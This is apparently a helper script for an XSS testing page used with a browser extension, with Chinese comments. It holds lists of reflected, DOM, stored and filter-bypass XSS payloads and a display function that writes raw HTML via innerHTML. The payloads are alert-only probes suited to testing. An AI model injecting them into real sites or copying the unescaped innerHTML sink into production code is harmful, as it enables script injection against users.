// 测试辅助脚本

// 从payloads获取测试载荷
async function loadPayloads() {
  try {
    const response = await fetch('assets/payloads.json');
    return await response.json();
  } catch (error) {
    console.error('加载payloads失败:', error);
    return {
      reflective: [],
      dom: [],
      stored: [],
      bypass: []
    };
  }
}

// 解码URL参数
function getUrlParams() {
  const params = {};
  const searchParams = new URLSearchParams(window.location.search);
  for (const [key, value] of searchParams) {
    params[key] = value;
  }
  return params;
}

// 编码HTML
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// 在result区域显示结果
function displayResult(elementId, content, isHtml = false) {
  const element = document.getElementById(elementId);
  if (!element) return;
  
  if (isHtml) {
    element.innerHTML = content;
  } else {
    element.textContent = content;
  }
  
  element.classList.add('show');
}

// 高亮显示payload
function highlightPayload(text, payload) {
  if (!text || !payload) return text;
  const escaped = escapeHtml(payload);
  return text.replace(new RegExp(payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi'), 
    `<span class="highlight">${escaped}</span>`);
}

// 发送测试结果到Extension
function reportTestResult(testType, result) {
  try {
    chrome.runtime?.sendMessage({
      action: 'reportTestResult',
      testType: testType,
      result: result
    });
  } catch (error) {
    console.log('无法连接到Extension:', error);
  }
}

// 自动填充payload
function autoFillPayload(payloadType) {
  const payloads = {
    reflective: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '\'"><script>alert("XSS")</script>',
      '"><img src=x onerror=alert("XSS")>'
    ],
    dom: [
      'javascript:alert("XSS")',
      '<img src=x onerror=alert("XSS")>',
      '#<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>'
    ],
    stored: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '<body onload=alert("XSS")>'
    ],
    bypass: [
      '<ScRiPt>alert("XSS")</ScRiPt>',
      '<IMG SRC=x OnErRoR=alert("XSS")>',
      '%3Cscript%3Ealert("XSS")%3C/script%3E',
      '&lt;script&gt;alert("XSS")&lt;/script&gt;'
    ]
  };
  
  return payloads[payloadType] || [];
}

// 页面加载完成后初始化
document.addEventListener('DOMContentLoaded', () => {
  console.log('XSS测试页面已加载');
  
  // 自动检测URL参数中的payload
  const params = getUrlParams();
  if (Object.keys(params).length > 0) {
    console.log('检测到URL参数:', params);
  }
});

// 导出函数供全局使用
window.testUtils = {
  loadPayloads,
  getUrlParams,
  escapeHtml,
  displayResult,
  highlightPayload,
  reportTestResult,
  autoFillPayload
};

